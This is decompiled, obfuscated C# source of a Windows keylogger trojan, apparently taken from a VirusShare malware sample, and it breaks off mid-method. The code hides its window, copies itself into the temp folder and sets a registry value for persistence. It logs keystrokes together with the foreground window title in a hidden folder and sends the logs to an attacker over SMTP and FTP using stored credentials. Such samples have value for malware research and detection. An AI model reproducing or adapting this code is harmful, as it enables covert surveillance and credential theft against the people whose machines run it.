// Decompiled with JetBrains decompiler
// Type: .
// Assembly: d1a3l0s, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 50A68CBD-55EA-4E40-8DCB-F2A44DFB42DE
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.aml-44c1ddfbe16f7426b43f0f84e1cff26f11ab5843bd621cd6766374fa6511763b.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace \u0003
{
  internal class \u0003 : Form
  {
    [NonSerialized]
    internal static \u0001.\u0001 \u0001;
    private IContainer \u0001;
    private TextBox \u0001;
    private TextBox \u0002;
    private TextBox \u0003;
    private System.Windows.Forms.Timer \u0001;
    private TextBox \u0004;
    private System.Windows.Forms.Timer \u0002;
    private System.Windows.Forms.Timer \u0003;
    private System.Windows.Forms.Timer \u0004;
    private string \u0001;
    private string \u0002;
    private string \u0003;
    private readonly byte[] \u0001;
    private readonly byte[] \u0002;
    private \u0005.\u0001.\u0001 \u0001;
    private string[] \u0001;
    private string \u0004;
    private string \u0005;
    private string \u0006;
    private string \u0007;
    private string \u0008;
    private string \u000E;
    private string \u000F;
    private string \u0010;
    private string \u0011;
    private string \u0012;
    private string \u0013;
    private string \u0014;
    private string \u0015;
    private string \u0016;
    private string \u0017;
    private string \u0018;
    private string \u0019;
    private string \u001A;
    private string \u001B;
    private string \u001C;
    private string \u001D;
    private string \u001E;
    private string \u001F;
    private string \u007F;
    private string \u0080;
    private string \u0081;
    private string \u0082;
    private string \u0083;
    private string \u0084;
    private string \u0086;
    private string \u0087;
    private string \u0088;
    private string \u0089;
    private string \u008A;
    private string \u008B;
    private string \u008C;
    private string \u008D;
    private string \u008E;
    private string \u008F;
    private string \u0090;
    private string \u0091;
    private string \u0092;
    private string \u0093;
    private string \u0094;
    private string \u0095;
    private string \u0096;
    private string \u0097;
    private string \u0098;
    private string \u0099;
    private string \u009A;
    private string \u009B;
    private string \u009C;
    private string \u009D;
    private string \u009E;
    private string \u009F;
    private string \u0001\u0002;
    private string \u0002\u0002;
    private string \u0003\u0002;
    private string \u0004\u0002;
    private string \u0005\u0002;
    private string \u0006\u0002;
    private string \u0007\u0002;
    private string \u0008\u0002;
    private string \u000E\u0002;
    private string \u000F\u0002;
    private \u0003.\u0003.\u0001 \u0001;
    private string \u0010\u0002;
    private \u0004.\u0001.\u0001 \u0001;
    private string \u0011\u0002;
    private string \u0012\u0002;

    public \u0003()
    {
      this.FormClosing += new FormClosingEventHandler(this.\u0002);
      this.Load += new EventHandler(this.\u0002);
      this.\u0001 = Path.GetTempPath();
      this.\u0002 = \u0003.\u0003.\u0001(1089) + \u0002.\u0003.\u0002().Name + \u0003.\u0003.\u0001(1214);
      this.\u0003 = \u0003.\u0003.\u0001(1428);
      this.\u0001 = new byte[24]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8,
        (byte) 9,
        (byte) 10,
        (byte) 11,
        (byte) 12,
        (byte) 13,
        (byte) 14,
        (byte) 15,
        (byte) 16,
        (byte) 17,
        (byte) 18,
        (byte) 19,
        (byte) 20,
        (byte) 21,
        (byte) 22,
        (byte) 23,
        (byte) 24
      };
      this.\u0002 = new byte[8]
      {
        byte.MaxValue,
        (byte) 70,
        (byte) 60,
        (byte) 50,
        (byte) 40,
        (byte) 30,
        (byte) 20,
        (byte) 10
      };
      this.\u0001 = new \u0005.\u0001.\u0001(this.\u0001, this.\u0002);
      this.\u0002(new \u0003.\u0003.\u0001());
      this.\u0010\u0002 = (string) null;
      this.\u0002(new \u0004.\u0001.\u0001());
      this.\u0012\u0002 = (string) null;
      this.\u0002();
    }

    [DebuggerNonUserCode]
    protected override void Dispose([In] bool obj0)
    {
      try
      {
        if (!obj0 || this.\u0001 == null)
          return;
        this.\u0001.Dispose();
      }
      finally
      {
        base.Dispose(obj0);
      }
    }

    private void \u0002()
    {
      this.\u0001 = (IContainer) new System.ComponentModel.Container();
      this.\u0002(new TextBox());
      this.\u0003(new TextBox());
      this.\u0004(new TextBox());
      this.\u0002(new System.Windows.Forms.Timer(this.\u0001));
      this.\u0005(new TextBox());
      this.\u0003(new System.Windows.Forms.Timer(this.\u0001));
      this.\u0004(new System.Windows.Forms.Timer(this.\u0001));
      this.\u0005(new System.Windows.Forms.Timer(this.\u0001));
      this.SuspendLayout();
      this.\u0002().BorderStyle = BorderStyle.FixedSingle;
      TextBox textBox1 = this.\u0002();
      Point point1 = new Point(15, 10);
      Point point2 = point1;
      textBox1.Location = point2;
      this.\u0002().Multiline = true;
      this.\u0002().Name = \u0003.\u0003.\u0001(1493);
      TextBox textBox2 = this.\u0002();
      Size size1 = new Size(159, 34);
      Size size2 = size1;
      textBox2.Size = size2;
      this.\u0002().TabIndex = 22;
      TextBox textBox3 = this.\u0003();
      point1 = new Point(15, 200);
      Point point3 = point1;
      textBox3.Location = point3;
      this.\u0003().Name = \u0003.\u0003.\u0001(1506);
      TextBox textBox4 = this.\u0003();
      size1 = new Size(16, 20);
      Size size3 = size1;
      textBox4.Size = size3;
      this.\u0003().TabIndex = 23;
      this.\u0004().BorderStyle = BorderStyle.FixedSingle;
      TextBox textBox5 = this.\u0004();
      point1 = new Point(15, 103);
      Point point4 = point1;
      textBox5.Location = point4;
      this.\u0004().Multiline = true;
      this.\u0004().Name = \u0003.\u0003.\u0001(1531);
      TextBox textBox6 = this.\u0004();
      size1 = new Size(159, 34);
      Size size4 = size1;
      textBox6.Size = size4;
      this.\u0004().TabIndex = 24;
      TextBox textBox7 = this.\u0005();
      point1 = new Point(118, 200);
      Point point5 = point1;
      textBox7.Location = point5;
      this.\u0005().Name = \u0003.\u0003.\u0001(1540);
      TextBox textBox8 = this.\u0005();
      size1 = new Size(16, 20);
      Size size5 = size1;
      textBox8.Size = size5;
      this.\u0005().TabIndex = 25;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(42, 22);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.\u0005());
      this.Controls.Add((Control) this.\u0004());
      this.Controls.Add((Control) this.\u0003());
      this.Controls.Add((Control) this.\u0002());
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = \u0003.\u0003.\u0001(1553);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = \u0003.\u0003.\u0001(1562);
      this.WindowState = FormWindowState.Minimized;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    [SpecialName]
    internal virtual TextBox \u0002() => this.\u0001;

    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void \u0002([In] TextBox obj0) => this.\u0001 = obj0;

    [SpecialName]
    internal virtual TextBox \u0003() => this.\u0002;

    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void \u0003([In] TextBox obj0) => this.\u0002 = obj0;

    [SpecialName]
    internal virtual TextBox \u0004() => this.\u0003;

    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void \u0004([In] TextBox obj0) => this.\u0003 = obj0;

    [SpecialName]
    internal virtual System.Windows.Forms.Timer \u0002() => this.\u0001;

    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void \u0002([In] System.Windows.Forms.Timer obj0)
    {
      EventHandler eventHandler = new EventHandler(this.\u0003);
      if (this.\u0001 != null)
        this.\u0001.Tick -= eventHandler;
      this.\u0001 = obj0;
      if (this.\u0001 == null)
        return;
      this.\u0001.Tick += eventHandler;
    }

    [SpecialName]
    internal virtual TextBox \u0005() => this.\u0004;

    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void \u0005([In] TextBox obj0) => this.\u0004 = obj0;

    [SpecialName]
    internal virtual System.Windows.Forms.Timer \u0003() => this.\u0002;

    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void \u0003([In] System.Windows.Forms.Timer obj0)
    {
      EventHandler eventHandler = new EventHandler(this.\u0004);
      if (this.\u0002 != null)
        this.\u0002.Tick -= eventHandler;
      this.\u0002 = obj0;
      if (this.\u0002 == null)
        return;
      this.\u0002.Tick += eventHandler;
    }

    [SpecialName]
    internal virtual System.Windows.Forms.Timer \u0004() => this.\u0003;

    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void \u0004([In] System.Windows.Forms.Timer obj0)
    {
      EventHandler eventHandler = new EventHandler(this.\u0005);
      if (this.\u0003 != null)
        this.\u0003.Tick -= eventHandler;
      this.\u0003 = obj0;
      if (this.\u0003 == null)
        return;
      this.\u0003.Tick += eventHandler;
    }

    [SpecialName]
    internal virtual System.Windows.Forms.Timer \u0005() => this.\u0004;

    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void \u0005([In] System.Windows.Forms.Timer obj0)
    {
      EventHandler eventHandler = new EventHandler(this.\u0006);
      if (this.\u0004 != null)
        this.\u0004.Tick -= eventHandler;
      this.\u0004 = obj0;
      if (this.\u0004 == null)
        return;
      this.\u0004.Tick += eventHandler;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    private virtual void \u0002([In] \u0003.\u0003.\u0001 obj0) => this.\u0001 = obj0;

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0002();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0002(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    private string \u0002()
    {
      string lpString = new string(char.MinValue, 100);
      \u0003.\u0003.\u0002(\u0003.\u0003.\u0002(), ref lpString, 100);
      return lpString.Substring(0, checked (Strings.InStr(lpString, \u0003.\u0003.\u0001(1575)) - 1));
    }

    [SpecialName]
    private virtual \u0004.\u0001.\u0001 \u0002() => this.\u0001;

    [SpecialName]
    [MethodImpl(MethodImplOptions.Synchronized)]
    private virtual void \u0002([In] \u0004.\u0001.\u0001 obj0)
    {
      \u0004.\u0001.\u0001.\u0002 obj = new \u0004.\u0001.\u0001.\u0002(this.\u0002);
      if (this.\u0001 != null)
        \u0004.\u0001.\u0001.\u0003(obj);
      this.\u0001 = obj0;
      if (this.\u0001 == null)
        return;
      \u0004.\u0001.\u0001.\u0002(obj);
    }

    private void \u0002([In] object obj0, [In] FormClosingEventArgs obj1) => this.\u0002().\u0003();

    private void \u0002([In] string obj0)
    {
      try
      {
        if (Operators.CompareString(this.\u0010\u0002, this.\u0002(), false) != 0 && Operators.CompareString(this.\u0002(), \u0003.\u0003.\u0001(333), false) != 0)
        {
          this.\u0002().Text = this.\u0002().Text + \u0003.\u0003.\u0001(1580) + this.\u0002() + \u0003.\u0003.\u0001(1613);
          this.\u0010\u0002 = this.\u0002();
        }
        this.\u0011\u0002 += obj0;
        this.\u0002().Text += obj0;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void \u0002([In] object obj0, [In] EventArgs obj1)
    {
      this.Visible = false;
      this.Hide();
      FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
      this.\u0004 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0005 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0006 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0007 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u001E = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0011 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u001F = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0008 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u000E = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u000F = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0010 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u007F = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0097 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0098 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0099 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u009A = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u009B = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u009C = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u009D = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u009E = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u009F = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0001\u0002 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0002\u0002 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0003\u0002 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0004\u0002 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0005\u0002 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0006\u0002 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0080 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0095 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0096 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0081 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0082 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0086 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0084 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0083 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0087 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0014 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0088 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0089 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0018 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u008A = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u008B = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0012 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u008C = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0013 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u008D = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0019 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u008E = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u001A = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u008F = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0090 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0091 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0092 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0093 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u001B = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u001C = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0007\u0002 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0094 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0015 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0016 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0017 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u0008\u0002 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u000E\u0002 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u000F\u0002 = Strings.Space(checked ((int) FileSystem.LOF(1)));
      this.\u001D = Strings.Space(checked ((int) FileSystem.LOF(1)));
      FileSystem.FileGet(1, ref this.\u0004);
      FileSystem.FileGet(1, ref this.\u0005);
      FileSystem.FileGet(1, ref this.\u0006);
      FileSystem.FileGet(1, ref this.\u0007);
      FileSystem.FileGet(1, ref this.\u001E);
      FileSystem.FileGet(1, ref this.\u0011);
      FileSystem.FileGet(1, ref this.\u001F);
      FileSystem.FileGet(1, ref this.\u0008);
      FileSystem.FileGet(1, ref this.\u000E);
      FileSystem.FileGet(1, ref this.\u000F);
      FileSystem.FileGet(1, ref this.\u0010);
      FileSystem.FileGet(1, ref this.\u007F);
      FileSystem.FileGet(1, ref this.\u0097);
      FileSystem.FileGet(1, ref this.\u0098);
      FileSystem.FileGet(1, ref this.\u0099);
      FileSystem.FileGet(1, ref this.\u009A);
      FileSystem.FileGet(1, ref this.\u009B);
      FileSystem.FileGet(1, ref this.\u009C);
      FileSystem.FileGet(1, ref this.\u009D);
      FileSystem.FileGet(1, ref this.\u009E);
      FileSystem.FileGet(1, ref this.\u009F);
      FileSystem.FileGet(1, ref this.\u0001\u0002);
      FileSystem.FileGet(1, ref this.\u0002\u0002);
      FileSystem.FileGet(1, ref this.\u0003\u0002);
      FileSystem.FileGet(1, ref this.\u0004\u0002);
      FileSystem.FileGet(1, ref this.\u0005\u0002);
      FileSystem.FileGet(1, ref this.\u0006\u0002);
      FileSystem.FileGet(1, ref this.\u0080);
      FileSystem.FileGet(1, ref this.\u0095);
      FileSystem.FileGet(1, ref this.\u0096);
      FileSystem.FileGet(1, ref this.\u0081);
      FileSystem.FileGet(1, ref this.\u0082);
      FileSystem.FileGet(1, ref this.\u0086);
      FileSystem.FileGet(1, ref this.\u0084);
      FileSystem.FileGet(1, ref this.\u0083);
      FileSystem.FileGet(1, ref this.\u0087);
      FileSystem.FileGet(1, ref this.\u0014);
      FileSystem.FileGet(1, ref this.\u0088);
      FileSystem.FileGet(1, ref this.\u0089);
      FileSystem.FileGet(1, ref this.\u0018);
      FileSystem.FileGet(1, ref this.\u008A);
      FileSystem.FileGet(1, ref this.\u008B);
      FileSystem.FileGet(1, ref this.\u0012);
      FileSystem.FileGet(1, ref this.\u008C);
      FileSystem.FileGet(1, ref this.\u0013);
      FileSystem.FileGet(1, ref this.\u008D);
      FileSystem.FileGet(1, ref this.\u0019);
      FileSystem.FileGet(1, ref this.\u008E);
      FileSystem.FileGet(1, ref this.\u001A);
      FileSystem.FileGet(1, ref this.\u008F);
      FileSystem.FileGet(1, ref this.\u0090);
      FileSystem.FileGet(1, ref this.\u0091);
      FileSystem.FileGet(1, ref this.\u0092);
      FileSystem.FileGet(1, ref this.\u0093);
      FileSystem.FileGet(1, ref this.\u001B);
      FileSystem.FileGet(1, ref this.\u001C);
      FileSystem.FileGet(1, ref this.\u0007\u0002);
      FileSystem.FileGet(1, ref this.\u0094);
      FileSystem.FileGet(1, ref this.\u0015);
      FileSystem.FileGet(1, ref this.\u0016);
      FileSystem.FileGet(1, ref this.\u0017);
      FileSystem.FileGet(1, ref this.\u0008\u0002);
      FileSystem.FileGet(1, ref this.\u000E\u0002);
      FileSystem.FileGet(1, ref this.\u000F\u0002);
      FileSystem.FileGet(1, ref this.\u001D);
      this.\u0001 = Strings.Split(Encoding.Default.GetString(\u0004.\u0003.\u0002(Application.ExecutablePath)), \u0003.\u0003.\u0001(1646));
      this.\u0005().Text = this.\u0001[29];
      if (Operators.CompareString(Path.GetFileNameWithoutExtension(Application.ExecutablePath), this.\u0001[55], false) == 0)
      {
        this.\u0004();
        string executablePath1 = Application.ExecutablePath;
        string str1 = this.\u0001 + \u0003.\u0003.\u0001(1667);
        if (System.IO.File.Exists(executablePath1) && !System.IO.File.Exists(str1))
        {
          System.IO.File.Copy(executablePath1, str1);
          Process.Start(str1);
        }
        if (Conversions.ToBoolean(this.\u0001[44]))
        {
          string str2 = this.\u0001 + Path.GetFileName(Application.ExecutablePath);
          try
          {
            if (Operators.CompareString(Application.ExecutablePath, this.\u0001 + Path.GetFileName(Application.ExecutablePath), false) != 0)
            {
              if (Operators.CompareString(Application.ExecutablePath, this.\u0001 + Path.GetFileName(Application.ExecutablePath), false) != 0)
                System.IO.File.Delete(this.\u0001 + Path.GetFileName(Application.ExecutablePath));
              string executablePath2 = Application.ExecutablePath;
              string str3 = this.\u0001 + Path.GetFileName(Application.ExecutablePath);
              if (System.IO.File.Exists(executablePath2) && !System.IO.File.Exists(str3))
                System.IO.File.Copy(executablePath2, str3);
              \u0002.\u0003.\u0002().Registry.CurrentUser.OpenSubKey(\u0003.\u0003.\u0001(1684), true).SetValue(\u0003.\u0003.\u0001(1741), (object) Application.ExecutablePath);
              Process.Start(this.\u0001 + Path.GetFileName(Application.ExecutablePath));
              ProjectData.EndApp();
            }
            else if (Operators.CompareString(Application.ExecutablePath, this.\u0001 + Path.GetFileName(Application.ExecutablePath), false) == 0)
            {
              Thread.Sleep(Convert.ToInt32(this.\u0001[45]));
              string str4 = Conversions.ToString(\u0002.\u0003.\u0002().Registry.CurrentUser.OpenSubKey(\u0003.\u0003.\u0001(1684), true).GetValue(\u0003.\u0003.\u0001(1741), (object) Application.ExecutablePath));
              if (Operators.CompareString(Application.ExecutablePath, str4, false) != 0 && System.IO.File.Exists(str4))
                FileSystem.Kill(str4);
            }
            if (Conversions.ToBoolean(this.\u0001[36]))
              \u0002.\u0003.\u0002().Registry.CurrentUser.OpenSubKey(\u0003.\u0003.\u0001(1750), true).SetValue(this.\u0001[37], (object) str2);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (!Conversions.ToBoolean(this.\u0001[44]) & Conversions.ToBoolean(this.\u0001[36]))
        {
          try
          {
            string tempPath = Path.GetTempPath();
            string executablePath3 = Application.ExecutablePath;
            string str5 = tempPath + Path.GetFileName(Application.ExecutablePath);
            if (System.IO.File.Exists(executablePath3) && !System.IO.File.Exists(str5))
              System.IO.File.Copy(executablePath3, str5);
            \u0002.\u0003.\u0002().Registry.CurrentUser.OpenSubKey(\u0003.\u0003.\u0001(1750), true).SetValue(this.\u0001[37], (object) str5);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else
        {
          int num = !Conversions.ToBoolean(this.\u0001[44]) & !Conversions.ToBoolean(this.\u0001[36]) ? 1 : 0;
        }
        if (Conversions.ToBoolean(this.\u0001[28]))
        {
          this.\u0002().\u0002();
          this.\u0002().Interval = Convert.ToInt32(this.\u0001[6]);
          this.\u0002().Start();
        }
        if (Conversions.ToBoolean(this.\u0001[30]))
          this.\u0004().Start();
        if (Conversions.ToBoolean(this.\u0001[42]))
        {
          this.\u0003().Interval = Convert.ToInt32(this.\u0001[43]);
          this.\u0003().Start();
        }
        if (Conversions.ToBoolean(this.\u0001[50]) | Conversions.ToBoolean(this.\u0001[51]) | Conversions.ToBoolean(this.\u0001[52]) | Conversions.ToBoolean(this.\u0001[53]) | Conversions.ToBoolean(this.\u0001[54]))
          this.\u0005().Start();
      }
      if (Operators.CompareString(Application.ExecutablePath, this.\u0001 + \u0003.\u0003.\u0001(1667), false) != 0)
        return;
      if (Conversions.ToBoolean(this.\u0001[12]))
        this.\u0003();
      if (Conversions.ToBoolean(this.\u0001[58]))
      {
        if (Operators.CompareString(this.\u0001[61], \u0003.\u0003.\u0001(1811), false) == 0)
        {
          int num1 = (int) Interaction.MsgBox((object) this.\u0001[60], MsgBoxStyle.Critical, (object) this.\u0001[59]);
        }
        else if (Operators.CompareString(this.\u0001[61], \u0003.\u0003.\u0001(1816), false) == 0)
        {
          int num2 = (int) Interaction.MsgBox((object) this.\u0001[60], MsgBoxStyle.Information, (object) this.\u0001[59]);
        }
        else if (Operators.CompareString(this.\u0001[61], \u0003.\u0003.\u0001(1821), false) == 0)
        {
          int num3 = (int) Interaction.MsgBox((object) this.\u0001[60], MsgBoxStyle.Exclamation, (object) this.\u0001[59]);
        }
        else if (Operators.CompareString(this.\u0001[61], \u0003.\u0003.\u0001(1826), false) == 0)
        {
          int num4 = (int) Interaction.MsgBox((object) this.\u0001[60], MsgBoxStyle.YesNo, (object) this.\u0001[59]);
        }
        else if (Operators.CompareString(this.\u0001[61], \u0003.\u0003.\u0001(1831), false) == 0)
        {
          int num5 = (int) Interaction.MsgBox((object) this.\u0001[60], MsgBoxStyle.YesNoCancel, (object) this.\u0001[59]);
        }
        else if (Operators.CompareString(this.\u0001[61], \u0003.\u0003.\u0001(1836), false) == 0)
        {
          int num6 = (int) Interaction.MsgBox((object) this.\u0001[60], MsgBoxStyle.AbortRetryIgnore, (object) this.\u0001[59]);
        }
      }
      ProjectData.EndApp();
    }

    public void \u0003()
    {
      if (Conversions.ToBoolean(this.\u0001[13]))
      {
        try
        {
          \u0003.\u0002.\u0002();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      string str = \u0003.\u0003.\u0001(1841) + \u0002.\u0003.\u0002().Name + DateTime.Now.ToString().Replace(\u0003.\u0003.\u0001(1862), \u0003.\u0003.\u0001(1867)).Replace(\u0003.\u0003.\u0001(1872), \u0003.\u0003.\u0001(1877)).Replace(\u0003.\u0003.\u0001(1882), \u0003.\u0003.\u0001(1867));
      try
      {
        if (!Directory.Exists(this.\u0001 + \u0003.\u0003.\u0001(1887)))
        {
          Directory.CreateDirectory(this.\u0001 + \u0003.\u0003.\u0001(1887));
          new DirectoryInfo(this.\u0001 + \u0003.\u0003.\u0001(1887)).Attributes = FileAttributes.Hidden;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        FileStream fileStream = new FileStream(this.\u0001 + \u0003.\u0003.\u0001(1896) + str + \u0003.\u0003.\u0001(1905), FileMode.Create, FileAccess.Write);
        StreamWriter streamWriter = new StreamWriter((Stream) fileStream);
        streamWriter.WriteLine(this.\u0002 + this.\u0004().Text + this.\u0003);
        streamWriter.Close();
        fileStream.Dispose();
        fileStream.Close();
        streamWriter.Dispose();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (Conversions.ToBoolean(this.\u0001[5]))
      {
        try
        {
          MailMessage message = new MailMessage();
          message.Subject = \u0003.\u0003.\u0001(1914) + \u0002.\u0003.\u0002().Name;
          message.To.Add(this.\u0001.\u0002(this.\u0001[1]));
          message.From = new MailAddress(this.\u0001.\u0002(this.\u0001[1]));
          message.Body = this.\u0002 + this.\u0004().Text + this.\u0003;
          message.IsBodyHtml = true;
          Attachment attachment = new Attachment(this.\u0001 + \u0003.\u0003.\u0001(1896) + str + \u0003.\u0003.\u0001(1905));
          message.Attachments.Add(attachment);
          new SmtpClient(this.\u0001.\u0002(this.\u0001[3]))
          {
            Port = Conversions.ToInteger(this.\u0001.\u0002(this.\u0001[4])),
            EnableSsl = true,
            Credentials = ((ICredentialsByHost) new NetworkCredential(this.\u0001.\u0002(this.\u0001[1]), this.\u0001.\u0002(this.\u0001[2])))
          }.Send(message);
          message.Dispose();
          attachment.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(this.\u0001[7]))
      {
        try
        {
          FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(\u0003.\u0003.\u0001(1935) + this.\u0001.\u0002(this.\u0001[10]) + \u0003.\u0003.\u0001(1862) + this.\u0001.\u0002(this.\u0001[11]) + \u0003.\u0003.\u0001(1862) + str + \u0003.\u0003.\u0001(1905));
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(this.\u0001.\u0002(this.\u0001[8]), this.\u0001.\u0002(this.\u0001[9]));
          ftpWebRequest.Method = \u0003.\u0003.\u0001(1944);
          byte[] buffer = System.IO.File.ReadAllBytes(this.\u0001 + \u0003.\u0003.\u0001(1896) + str + \u0003.\u0003.\u0001(1905));
          Stream requestStream = ftpWebRequest.GetRequestStream();
          requestStream.Write(buffer, 0, buffer.Length);
          requestStream.Close();
          requestStream.Dispose();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        this.\u0004().Clear();
        this.\u0004().Dispose();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void \u0003([In] object obj0, [In] EventArgs obj1)
    {
      string str = \u0003.\u0003.\u0001(1953) + \u0002.\u0003.\u0002().Name + DateTime.Now.ToString().Replace(\u0003.\u0003.\u0001(1862), \u0003.\u0003.\u0001(1867)).Replace(\u0003.\u0003.\u0001(1872), \u0003.\u0003.\u0001(1877)).Replace(\u0003.\u0003.\u0001(1882), \u0003.\u0003.\u0001(1867));
      try
      {
        if (!Directory.Exists(this.\u0001 + \u0003.\u0003.\u0001(1887)))
        {
          Directory.CreateDirectory(this.\u0001 + \u0003.\u0003.\u0001(1887));
          new DirectoryInfo(this.\u0001 + \u0003.\u0003.\u0001(1887)).Attributes = FileAttributes.Hidden;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
